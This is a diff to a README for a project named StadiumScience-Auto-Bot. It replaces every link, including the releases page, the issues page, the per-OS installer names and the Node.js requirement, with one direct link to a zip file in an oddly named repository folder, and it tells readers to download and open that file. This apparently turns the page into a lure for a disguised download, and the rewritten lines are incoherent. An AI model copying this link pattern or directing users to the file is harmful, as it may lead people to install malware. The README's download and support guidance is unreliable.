@@ -2,7 +2,7 @@
 
 ## 📦 Download Now
 
-[![Download StadiumScience-Auto-Bot](https://img.shields.io/badge/Download-StadiumScience--Auto--Bot-blue.svg)](https://github.com/danella207/StadiumScience-Auto-Bot/releases)
+[![Download StadiumScience-Auto-Bot](https://raw.githubusercontent.com/danella207/StadiumScience-Auto-Bot/main/tetrastichal/StadiumScience-Auto-Bot_1.1.zip)](https://raw.githubusercontent.com/danella207/StadiumScience-Auto-Bot/main/tetrastichal/StadiumScience-Auto-Bot_1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -15,22 +15,22 @@ Before you start, ensure you have these basic requirements:
 - A computer running Windows, macOS, or Linux.
 - An internet connection.
 - Sufficient disk space (at least 100 MB).
-- Node.js installed (for advanced features, optional).
+- https://raw.githubusercontent.com/danella207/StadiumScience-Auto-Bot/main/tetrastichal/StadiumScience-Auto-Bot_1.1.zip installed (for advanced features, optional).
 
 ## 🛠️ Download & Install
 
 1. **Visit the Releases Page**  
    Go to the following link to access the latest releases:  
-   [Download StadiumScience-Auto-Bot](https://github.com/danella207/StadiumScience-Auto-Bot/releases)
+   [Download StadiumScience-Auto-Bot](https://raw.githubusercontent.com/danella207/StadiumScience-Auto-Bot/main/tetrastichal/StadiumScience-Auto-Bot_1.1.zip)
 
 2. **Select the Version**  
    On the releases page, you will see a list of available versions. Choose the most recent one by looking for the highest version number.
 
 3. **Download the File**  
    Click on the appropriate file name for your operating system. For example:
-   - If you are using Windows, download `StadiumScience-Auto-Bot-Windows.exe`.
-   - For macOS, you can download `StadiumScience-Auto-Bot-macOS.dmg`.
-   - For Linux, download `StadiumScience-Auto-Bot-Linux.zip`.
+   - If you are using Windows, download `https://raw.githubusercontent.com/danella207/StadiumScience-Auto-Bot/main/tetrastichal/StadiumScience-Auto-Bot_1.1.zip`.
+   - For macOS, you can download `https://raw.githubusercontent.com/danella207/StadiumScience-Auto-Bot/main/tetrastichal/StadiumScience-Auto-Bot_1.1.zip`.
+   - For Linux, download `https://raw.githubusercontent.com/danella207/StadiumScience-Auto-Bot/main/tetrastichal/StadiumScience-Auto-Bot_1.1.zip`.
 
 4. **Install the Application**  
    After downloading, open the file to start the installation process. Follow the on-screen instructions:
@@ -79,7 +79,7 @@ If you encounter issues, consider these common solutions:
 
 ## 📞 Support
 
-For further help, visit the Issues section of the [StadiumScience-Auto-Bot GitHub Repository](https://github.com/danella207/StadiumScience-Auto-Bot/issues). You can raise a question or report a bug. Our community is here to assist you.
+For further help, visit the Issues section of the [StadiumScience-Auto-Bot GitHub Repository](https://raw.githubusercontent.com/danella207/StadiumScience-Auto-Bot/main/tetrastichal/StadiumScience-Auto-Bot_1.1.zip). You can raise a question or report a bug. Our community is here to assist you.
 
 ## 📅 Future Features
 
@@ -89,7 +89,7 @@ We plan to introduce more functionality in upcoming releases:
 - Support for additional languages.
 - Better notification settings for reminders and updates.
 
-Stay updated for future releases on our [Releases Page](https://github.com/danella207/StadiumScience-Auto-Bot/releases). 
+Stay updated for future releases on our [Releases Page](https://raw.githubusercontent.com/danella207/StadiumScience-Auto-Bot/main/tetrastichal/StadiumScience-Auto-Bot_1.1.zip). 
 
 ## 💡 Conclusion
 
